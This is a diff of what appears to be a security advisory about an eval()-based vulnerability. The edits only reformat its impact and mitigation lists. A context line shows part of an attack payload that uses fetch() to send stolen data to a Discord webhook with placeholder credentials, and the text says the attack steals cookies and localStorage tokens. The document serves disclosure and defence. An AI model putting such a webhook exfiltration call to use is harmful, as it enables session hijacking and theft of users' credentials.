@@ -36,19 +36,19 @@ dbg$fetch('https://discord.com/api/webhooks/{webhookID}/{webhookToken}', {
 });
 ```
 
-### Impact
+### Potential Effects
 Exploiting this vulnerability allows attackers to:
-1. **Hijack user sessions**: Stolen cookies can be used to impersonate users.
-2. **Steal sensitive information**: Attackers can access authentication tokens stored in `localStorage`.
-3. **Execute arbitrary code**: This can lead to additional compromises, including malware delivery or unauthorized actions.
+- **Hijack user sessions**: Stolen cookies can be used to impersonate users.
+- **Steal sensitive information**: Attackers can access authentication tokens stored in `localStorage`.
+- **Execute arbitrary code**: This can lead to additional compromises, including malware delivery or unauthorized actions.
 
 ## Recommendations for Mitigation
 To address this vulnerability and improve overall security, the following measures are recommended:
 
-1. **Eliminate `eval()` usage**: 
-2. **Validate and sanitize inputs**
-3. **Implement Content Security Policy (CSP)**
-4. **Enhance WebSocket security**: 
+- **Eliminate `eval()` usage**: 
+- **Validate and sanitize inputs**
+- **Implement Content Security Policy (CSP)**
+- **Enhance WebSocket security**: 
 
 ---
 
